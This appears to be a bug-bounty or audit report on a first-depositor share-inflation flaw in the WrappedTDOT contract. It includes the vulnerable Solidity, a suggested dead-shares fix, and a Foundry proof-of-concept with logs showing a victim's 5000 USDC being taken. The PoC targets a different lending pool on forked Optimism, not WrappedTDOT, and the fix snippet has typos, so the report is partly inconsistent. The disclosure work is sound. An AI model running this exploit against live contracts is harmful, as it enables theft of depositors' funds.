# Malicious first depositor of `WrappedTDOT` can steal late depositor' fund by manipulating deposit and withdrawal rate.

## Bug Description
Here's attack scenario when there's no depositor which is true.

1. A hacker deposits 1 wei of underlying token to become first depositor of `WrappedTDOT` and making `totalSupply()` as 1.
2. The hacker send large underlying token to `WrappedTDOT` address to manipulate deposit and withdraw rate to exceptionally high.
3. Subsequent depositors will get nothing or less eToken in return because of inflated deposit and withdraw rate.
4. The hacker can withdraw all token balance including subsequent depositor's fund.

He can repeat it any number of times whenever new depositor comes.

## Vulnerability Details

Here's the formula when totalSupply is greater than zero.

```
  depositRate = totalSupply() *1e18 / IERC20(tdot).balanceOf(address(this));
  withdrawRate = IERC20(tdot).balanceOf(address(this)) * 1e18 / totalSupply();
```

If totalSupply() == 1 and IERC20(tdot).balanceOf(address(this)) is greater than 1 ether.

```
  depositRate = 0
  withdrawRate = IERC20(tdot).balanceOf(address(this)) * 1e18;
```

If deposit rate is zero, depositor will not receive any share in exchange of deposited balance, it will belong to orignal depositor who has 100% of total supply, effectively rugging late depositor.

https://github.com/AcalaNetwork/Euphrates/blob/master/src/WrappedTDOT.sol#L63-L84
```
    function depositRate() public view returns (uint256) {
        uint256 tdotAmount = IERC20(tdot).balanceOf(address(this));
        uint256 wtdotAmount = totalSupply;

        if (wtdotAmount == 0 || tdotAmount == 0) {
            return 1e18;
        } else {
            return wtdotAmount.mul(1e18).div(tdotAmount);
        }
    }

    /// @inheritdoc IWTDOT
    function withdrawRate() public view returns (uint256) {
        uint256 tdotAmount = IERC20(tdot).balanceOf(address(this));
        uint256 wtdotAmount = totalSupply;

        if (wtdotAmount == 0) {
            return 0;
        } else {
            return tdotAmount.mul(1e18).div(wtdotAmount);
        }
    }

    function deposit(uint256 tdotAmount) public returns (uint256) {
        uint256 wtdotAmount = tdotAmount.mul(depositRate()).div(1e18);
        require(wtdotAmount != 0, "WTDOT: invalid WTDOT amount");

        IERC20(tdot).safeTransferFrom(msg.sender, address(this), tdotAmount);
        _mint(msg.sender, wtdotAmount);

        emit Deposit(msg.sender, tdotAmount, wtdotAmount);
        return wtdotAmount;
    }

    /// @inheritdoc IWTDOT
    function withdraw(uint256 wtdotAmount) public returns (uint256) {
        require(balanceOf[msg.sender] >= wtdotAmount, "WTDOT: WTDOT not enough");
        uint256 tdotAmount = wtdotAmount.mul(withdrawRate()).div(1e18);
        require(tdotAmount != 0, "WTDOT: invalid TDOT amount");

        _burn(msg.sender, wtdotAmount);
        IERC20(tdot).safeTransfer(msg.sender, tdotAmount);

        emit Withdraw(msg.sender, wtdotAmount, tdotAmount);
        return tdotAmount;
    }
```

## Impact

First depositor can steal future users' deposits while the victims will get lose all of his deposit.

## Recommendation
When initializing reserve, fixed amount of eToken should be minted to address(0).

By setting lower limit of total supply, it will become economically difficult to manipulate deposit rate for hacker.

```solidity
    constructor(address tdotAddr) ERC20("Wrapped TDOT", "WTDOT", 10) {
+       mint(addresss(0), 1000);
    }
```

## Proof of Concept
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
import "forge-std/Test.sol";

interface ILendingPool {
  function initReserve(address asset) external;

  function nextReserveId() external returns (uint256);

  function owner() external returns (address);

  function deposit(
      uint256 reserveId,
      uint256 amount,
      address onBehalfOf,
      uint16 referralCode
  ) external payable returns (uint256);

    function redeem(
        uint256 reserveId,
        uint256 eTokenAmount,
        address to,
        bool receiveNativeETH
  ) external payable returns (uint256);

    function getETokenAddress(uint256 reserveId) external view returns (address);

    function exchangeRateOfReserve(uint256 reserveId) external view returns (uint256);

}
interface   IERC20 {
  function name() external view returns (string memory);
  function decimals() external view returns (uint8);
  function balanceOf(address owner) external view returns (uint256);
  function totalSupply() external view returns (uint256);

  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
}

contract ContractTest is Test {
    address       hacker = 0xf8ea83bEC8CcBC3d5564E23FE71d15f1b1e7f2b0;
    address       victim = 0x1705fA8e57C4320048E3ed8F8B7523C340f2AA47;
    ILendingPool  lendingPool = ILendingPool(0xBB505c54D71E9e599cB8435b4F0cEEc05fC71cbD);
    IERC20        underlying = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85); // usdc

  function setUp() public {
    vm.createSelectFork("optimism"); 

    vm.label(address(lendingPool), "lendingPool");
    vm.label(address(underlying), "underlying");
    vm.label(address(hacker), "hacker");
    vm.label(address(victim), "victim");
  }

  function testExtra() public {
    vm.startPrank(lendingPool.owner());
    lendingPool.initReserve(address(underlying));

    uint256 reserveId = lendingPool.nextReserveId() - 1;
    IERC20  eToken = IERC20(lendingPool.getETokenAddress(reserveId));
    uint256 prevBalance = underlying.balanceOf(hacker);


    // Step 1
    console.log("Step 1 - Becoming first depostor and manipulating exchange rate");
    vm.startPrank(hacker);
    underlying.approve(address(lendingPool), type(uint256).max);
    eToken.approve(address(lendingPool), type(uint256).max);
    lendingPool.deposit(reserveId, 1, hacker, 0);
    emit log_named_decimal_uint("Exchange rate before manipulation", lendingPool.exchangeRateOfReserve(reserveId), 18);
    underlying.transfer(address(eToken), underlying.balanceOf(hacker));
    emit log_named_decimal_uint("Exchange rate after manipulation", lendingPool.exchangeRateOfReserve(reserveId), 18);
    emit log_named_decimal_uint("eToken totalSupply", eToken.totalSupply( ), 0);
    emit log_named_decimal_uint("Hackers's eToken balance", eToken.balanceOf(hacker), 0);
    emit log_named_decimal_uint("Hacker's underlying balance", underlying.balanceOf(hacker), 6);

    // Step 2
    console.log("");
    console.log("Step 2 - Stealing victim's deposit");
    vm.startPrank(victim);
    underlying.approve(address(lendingPool), type(uint256).max);
    eToken.approve(address(lendingPool), type(uint256).max);
    lendingPool.deposit(reserveId, 5000_000_000, victim, 0);
    emit log_named_decimal_uint("Victim's eToken balance", eToken.balanceOf(victim), 0);

    // Step 3
    console.log("");
    console.log("Step 3 - Withdrawing profit");
    vm.startPrank(hacker);
    lendingPool.redeem(reserveId, eToken.balanceOf(hacker), hacker, false);
    emit log_named_decimal_uint("Hacker's profit", underlying.balanceOf(hacker) - prevBalance, 6);
  }
}
```

###Output
```
Running 1 test for test/ExtraFinance_test.sol:ContractTest
[PASS] testExtra() (gas: 3289973)
Logs:
  Step 1 - Becoming first depostor and manipulating exchange rate
  Exchange rate before manipulation: 1.000000000000000000
  Exchange rate after manipulation: 10000000000.000000000000000000
  eToken totalSupply: 1.0
  Hackers's eToken balance: 1.0
  Hacker's underlying balance: 0.000000

  Step 2 - Stealing victim's deposit
  Victim's eToken balance: 0.0

  Step 3 - Withdrawing profit
  Hacker's profit: 5000.000000
```